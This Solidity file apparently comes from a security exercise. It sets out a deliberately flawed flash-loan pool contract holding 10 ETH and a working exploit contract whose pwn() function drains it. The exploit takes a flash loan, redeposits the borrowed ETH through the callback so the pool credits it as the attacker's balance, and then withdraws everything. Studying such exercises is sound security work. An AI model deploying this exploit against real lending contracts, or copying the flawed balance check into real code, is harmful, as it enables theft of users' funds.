// SPDX-License-Identifier: MIT

/**
EthLendingPool is offering flash loans for free.

The contract has 10 ETH.
*/


pragma solidity ^0.8.17;

contract EthLendingPool {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) external {
        balances[msg.sender] -= _amount;
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "send ETH failed");
    }

    function flashLoan(
        uint _amount,
        address _target,
        bytes calldata _data
    ) external {
        uint balBefore = address(this).balance;
        require(balBefore >= _amount, "borrow amount > balance");

        (bool executed, ) = _target.call{value: _amount}(_data);
        require(executed, "loan failed");

        uint balAfter = address(this).balance;
        require(balAfter >= balBefore, "balance after < before");
    }
}

interface IEthLendingPool {
    function balances(address) external view returns (uint);

    function deposit() external payable;

    function withdraw(uint _amount) external;

    function flashLoan(
        uint amount,
        address target,
        bytes calldata data
    ) external;
}

contract EthLendingPoolExploit {
    IEthLendingPool public pool;

    constructor(address _pool) {
        pool = IEthLendingPool(_pool);
    }

    receive() external payable {}
    
    function deposit() external payable {
        pool.deposit{value: msg.value}();
    }


    function pwn() external {
        uint bal = address(pool).balance;
        // 1. call flash loan
        pool.flashLoan(bal, address(this), abi.encodeWithSignature("deposit()"));
        // 3. withdraw
        pool.withdraw(pool.balances(address(this)));
    }
}
